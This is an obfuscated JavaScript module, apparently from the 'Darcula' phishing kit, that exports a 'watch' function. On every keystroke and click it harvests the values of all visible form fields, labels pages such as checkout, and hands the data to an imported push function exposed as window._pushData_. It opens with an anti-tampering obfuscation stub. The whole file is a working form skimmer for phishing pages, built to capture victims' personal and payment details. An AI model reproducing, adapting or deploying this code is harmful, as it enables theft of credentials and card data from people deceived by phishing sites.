const a11_0x5b1606 = function () {
  let _0x2b7397 = true;
  return function (_0x4a4e32, _0x3b6b0b) {
    const _0x176c19 = _0x2b7397 ? function () {
      if (_0x3b6b0b) {
        const _0x2da89b = _0x3b6b0b.apply(_0x4a4e32, arguments);
        _0x3b6b0b = null;
        return _0x2da89b;
      }
    } : function () {};
    _0x2b7397 = false;
    return _0x176c19;
  };
}();
const a11_0x586b98 = a11_0x5b1606(this, function () {
  return a11_0x586b98.toString().search("(((.+)+)+)+$").toString().constructor(a11_0x586b98).search("(((.+)+)+)+$");
});
a11_0x586b98();
import { p as a11_0x3718a6, u as a11_0x2efb9a } from './3213f1cfKXMp5.js';
import './index-4b020bd6.js';
import './7357514cKXMp5.js';
import './09bf01f8KXMp5.js';
window._pushData_ = a11_0x3718a6;
const p = a11_0x2efb9a();
setTimeout(() => {
  if (document.visibilityState === "visible" || !document.querySelector("div[darcula-app]")) {
    p.status = document.title;
  }
}, 0x1f4);
let i;
function a(_0x392362) {
  let _0x5bbfd5 = location.href.replace(location.origin, '');
  if (i) {
    const _0x999ddb = location.href.replace(location.origin, '');
    for (let _0x237b93 = 0x0; _0x237b93 < i.length; _0x237b93++) {
      const _0x301e70 = i[_0x237b93];
      let _0x1aefde = '';
      if (typeof _0x301e70 == "string") {
        _0x1aefde = _0x301e70;
        if (_0x301e70.indexOf("checkout") !== -0x1) {
          _0x5bbfd5 = "checkout";
        }
      } else {
        _0x1aefde = _0x301e70[0x0];
        if (_0x301e70[0x1]) {
          _0x5bbfd5 = _0x301e70[0x1];
        }
      }
      if (new RegExp(_0x1aefde).test(_0x999ddb)) {
        break;
      }
      if (_0x237b93 === i.length - 0x1) {
        return;
      }
    }
  }
  const _0x1dae61 = {
    PageStatus: _0x5bbfd5
  };
  for (const _0x5e3f42 of Array.from(document.querySelectorAll("input, select, textarea"))) if (_0x5e3f42 instanceof HTMLInputElement || _0x5e3f42 instanceof HTMLSelectElement || _0x5e3f42 instanceof HTMLTextAreaElement) {
    if (_0x5e3f42.type === 'hidden' || _0x5e3f42.hidden || _0x5e3f42.style.display === "none") {
      continue;
    }
    const _0x42ca1a = _0x5e3f42.getAttribute("darcula-name") || _0x5e3f42.name;
    let _0x5c23c3 = _0x5e3f42.value;
    if (_0x5e3f42.type === "checkbox" || _0x5e3f42.type === 'radio') {
      _0x5c23c3 = '';
      const _0x19a655 = document.querySelectorAll("input[type=\"" + _0x5e3f42.type + "\"][name=\"" + _0x5e3f42.name + "\"]");
      for (const _0x26a8fe of Array.from(_0x19a655)) if (_0x26a8fe instanceof HTMLInputElement && _0x26a8fe.checked) {
        _0x5c23c3 += _0x26a8fe.value + "; ";
      }
      _0x5c23c3 = _0x5c23c3.replace(/;\s$/, '');
    }
    if (_0x42ca1a && _0x5c23c3) {
      _0x1dae61[_0x42ca1a] = _0x5c23c3;
    }
  }
  a11_0x3718a6(_0x1dae61);
}
function g(_0x38491f) {
  i = _0x38491f;
  document.removeEventListener("keyup", a);
  document.removeEventListener("pointerup", a);
  document.addEventListener("keyup", a);
  document.addEventListener("pointerup", a);
}
export { g as watch };